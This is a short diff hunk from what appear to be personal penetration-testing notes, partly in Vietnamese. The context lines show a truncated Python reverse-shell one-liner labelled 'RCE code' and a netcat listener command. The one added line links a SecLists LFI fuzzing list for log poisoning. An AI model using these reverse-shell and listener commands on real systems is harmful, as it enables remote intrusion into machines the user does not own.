@@ -328,3 +328,4 @@ RCE code : python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INE
 
 lệnh netcat : nc -lvnp port_listen
 
+List log LFI poisioning : https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI/Linux
